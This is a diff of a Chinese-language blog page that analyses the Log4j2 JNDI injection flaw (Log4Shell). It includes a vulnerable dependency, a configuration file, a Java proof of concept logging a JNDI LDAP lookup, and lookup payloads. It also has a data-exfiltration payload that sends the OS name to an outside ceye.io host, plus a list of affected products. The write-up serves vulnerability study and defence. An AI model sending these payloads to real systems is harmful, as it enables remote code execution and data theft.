@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.92.0" /><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.883a355335df5c9f19d469cd25bb68215497fd354fb3a8699eaf851799c161a8.js"></script>
+        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>
 
     
 
@@ -288,12 +288,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependency&gt;</span>
-    <span class="nt">&lt;groupId&gt;</span>org.apache.logging.log4j<span class="nt">&lt;/groupId&gt;</span>
-    <span class="nt">&lt;artifactId&gt;</span>log4j-core<span class="nt">&lt;/artifactId&gt;</span>
-    <span class="nt">&lt;version&gt;</span>2.14.1<span class="nt">&lt;/version&gt;</span>
-<span class="nt">&lt;/dependency&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.logging.log4j<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>log4j-core<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.14.1<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>在工程目录resources下创建log4j2.xml。</p>
 <div class="highlight"><div class="chroma">
@@ -315,22 +315,22 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
-<span class="nt">&lt;configuration</span> <span class="na">status=</span><span class="s">&#34;error&#34;</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;appenders&gt;</span>
-        <span class="c">&lt;!--配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;</span>
-        <span class="nt">&lt;Console</span> <span class="na">name=</span><span class="s">&#34;Console&#34;</span> <span class="na">target=</span><span class="s">&#34;SYSTEM_OUT&#34;</span> <span class="nt">&gt;</span>
-            <span class="c">&lt;!--配置Console的模式布局--&gt;</span>
-            <span class="nt">&lt;PatternLayout</span> <span class="na">pattern=</span><span class="s">&#34;%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n&#34;</span><span class="nt">/&gt;</span>
-        <span class="nt">&lt;/Console&gt;</span>
-    <span class="nt">&lt;/appenders&gt;</span>
-    <span class="nt">&lt;loggers&gt;</span>
-        <span class="nt">&lt;root</span> <span class="na">level=</span><span class="s">&#34;info&#34;</span><span class="nt">&gt;</span>
-            <span class="nt">&lt;appender-ref</span> <span class="na">ref=</span><span class="s">&#34;Console&#34;</span><span class="nt">/&gt;</span>
-        <span class="nt">&lt;/root&gt;</span>
-    <span class="nt">&lt;/loggers&gt;</span>
-<span class="nt">&lt;/configuration&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;configuration</span> <span class="na">status=</span><span class="s">&#34;error&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;appenders&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="c">&lt;!--配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Console</span> <span class="na">name=</span><span class="s">&#34;Console&#34;</span> <span class="na">target=</span><span class="s">&#34;SYSTEM_OUT&#34;</span> <span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="c">&lt;!--配置Console的模式布局--&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;PatternLayout</span> <span class="na">pattern=</span><span class="s">&#34;%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/Console&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/appenders&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;loggers&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;root</span> <span class="na">level=</span><span class="s">&#34;info&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;appender-ref</span> <span class="na">ref=</span><span class="s">&#34;Console&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/root&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/loggers&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/configuration&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="配置文件介绍"><a href="#配置文件介绍" class="anchor-link">#</a><a href="#contents:配置文件介绍" class="headings">配置文件介绍</a></h3>
 <p>下面对配置文件中有关参数进行介绍</p>
@@ -354,14 +354,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">%d{HH:mm:ss.SSS} 表示输出到毫秒的时间
-%t 输出当前线程名称
-%-5level 输出日志级别，-5表示左对齐并且固定输出5个字符，如果不足在右边补0
-%logger 输出logger名称，因为Root Logger没有名称，所以没有输出
-%msg 日志文本
-%n 换行
-...
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">%d{HH:mm:ss.SSS} 表示输出到毫秒的时间
+</span></span><span class="line"><span class="cl">%t 输出当前线程名称
+</span></span><span class="line"><span class="cl">%-5level 输出日志级别，-5表示左对齐并且固定输出5个字符，如果不足在右边补0
+</span></span><span class="line"><span class="cl">%logger 输出logger名称，因为Root Logger没有名称，所以没有输出
+</span></span><span class="line"><span class="cl">%msg 日志文本
+</span></span><span class="line"><span class="cl">%n 换行
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 </ul>
@@ -390,17 +390,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">log4j2Exploit</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">run</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${jndi:ldap://127.0.0.1:3890/test}&#34;</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">log4j2Exploit</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">run</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${jndi:ldap://127.0.0.1:3890/test}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>跟进<code>logger.error()→logIfEnabled()→isEnabled()→filter()</code> 中判断了当前调用的日志等级是否高于等于配置文件中配置的。（intLevel的值是日志等级越高，值就越小）
 <img src="/images/image-20220116152734.png" alt="">
@@ -438,9 +438,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">runtime</span><span class="o">}</span> <span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">vm</span><span class="o">}</span> <span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">os</span><span class="o">}</span> <span class="c1">//获取java运行时版本，jvm版本，和操作系统版本
-</span><span class="c1"></span><span class="n">$</span><span class="o">{</span><span class="n">sys</span><span class="o">:</span><span class="n">java</span><span class="o">.</span><span class="na">version</span><span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">runtime</span><span class="o">}</span> <span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">vm</span><span class="o">}</span> <span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">os</span><span class="o">}</span> <span class="c1">//获取java运行时版本，jvm版本，和操作系统版本
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">$</span><span class="o">{</span><span class="n">sys</span><span class="o">:</span><span class="n">java</span><span class="o">.</span><span class="na">version</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>外带数据: <code>${jndi:ldap://${java:os}.2lnhn2.ceye.io}</code></p>
 <p>还可利用Bundle协议读取项目配置文件来获取敏感信息。</p>
@@ -496,22 +496,22 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">Spring</span><span class="o">-</span><span class="n">Boot</span><span class="o">-</span><span class="n">strater</span><span class="o">-</span><span class="n">log4j2</span>
-<span class="n">Apache</span> <span class="n">Struts2</span>
-<span class="n">Apache</span> <span class="n">Solr</span>
-<span class="n">Apache</span> <span class="n">Flink</span>
-<span class="n">Apache</span> <span class="n">Druid</span>
-<span class="n">ElasticSearch</span>
-<span class="n">flume</span>
-<span class="n">dubbo</span>
-<span class="n">Redis</span>
-<span class="n">logstash</span>
-<span class="n">kafka</span>
-<span class="n">VMware</span> <span class="n">Horizon</span>
-<span class="n">VMware</span> <span class="n">vCenter</span> <span class="n">Server</span>
-<span class="n">VMware</span> <span class="n">HCX</span>
-<span class="n">VMware</span> <span class="n">NSX</span><span class="o">-</span><span class="n">T</span> <span class="n">Data</span> <span class="n">Center</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Spring</span><span class="o">-</span><span class="n">Boot</span><span class="o">-</span><span class="n">strater</span><span class="o">-</span><span class="n">log4j2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Apache</span> <span class="n">Struts2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Apache</span> <span class="n">Solr</span>
+</span></span><span class="line"><span class="cl"><span class="n">Apache</span> <span class="n">Flink</span>
+</span></span><span class="line"><span class="cl"><span class="n">Apache</span> <span class="n">Druid</span>
+</span></span><span class="line"><span class="cl"><span class="n">ElasticSearch</span>
+</span></span><span class="line"><span class="cl"><span class="n">flume</span>
+</span></span><span class="line"><span class="cl"><span class="n">dubbo</span>
+</span></span><span class="line"><span class="cl"><span class="n">Redis</span>
+</span></span><span class="line"><span class="cl"><span class="n">logstash</span>
+</span></span><span class="line"><span class="cl"><span class="n">kafka</span>
+</span></span><span class="line"><span class="cl"><span class="n">VMware</span> <span class="n">Horizon</span>
+</span></span><span class="line"><span class="cl"><span class="n">VMware</span> <span class="n">vCenter</span> <span class="n">Server</span>
+</span></span><span class="line"><span class="cl"><span class="n">VMware</span> <span class="n">HCX</span>
+</span></span><span class="line"><span class="cl"><span class="n">VMware</span> <span class="n">NSX</span><span class="o">-</span><span class="n">T</span> <span class="n">Data</span> <span class="n">Center</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5MDc1NDc1MQ==&amp;mid=2247491068&amp;idx=1&amp;sn=c41b8b9e561d5ddaa539b41dc661ba2b&amp;chksm=9007862ca7700f3a302398570f65ee438010c2e92a9096ae2870174cb2c79beab018663d47f5#rd" target="_blank" rel="noopener">受影响的主流应用软件</a></p>
 <h2 id="修复与防御"><a href="#修复与防御" class="anchor-link">#</a><a href="#contents:修复与防御" class="headings">修复与防御</a></h2>
